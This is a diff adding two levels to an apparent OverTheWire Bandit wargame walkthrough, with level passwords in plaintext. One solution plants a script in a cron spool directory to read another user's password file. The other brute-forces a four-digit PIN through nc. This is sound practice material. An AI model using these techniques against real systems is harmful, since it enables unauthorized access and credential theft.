@@ -349,3 +349,33 @@ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
 ```
 
 pwd: `0Zf11ioIjMVN551jX3CmStKLYqjk54Ga`
+
+## Level 23 -> Level 24
+
+```bash
+sshpass -p0Zf11ioIjMVN551jX3CmStKLYqjk54Ga ssh bandit23@bandit.labs.overthewire.org -p 2220
+ls /etc/cron.d/
+cat /etc/cron.d/cronjob_bandit24
+cat /usr/bin/cronjob_bandit24.sh
+cd /var/spool/bandit24/foo/
+vi get_pass.sh
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/pass_bandit24.txt
+:wq!
+chmod +x get_pass.sh
+ls -l get_pass.sh
+cat /tmp/pass_bandit24.txt
+exit
+```
+
+pwd: `gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8`
+
+## Level 24 -> Level 25
+
+```bash
+sshpass -pgb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 ssh bandit24@bandit.labs.overthewire.org -p 2220
+for pin in $(seq -w 0000 9999); do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $pin"; done | nc localhost 30002
+exit
+```
+
+pwd: `iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`
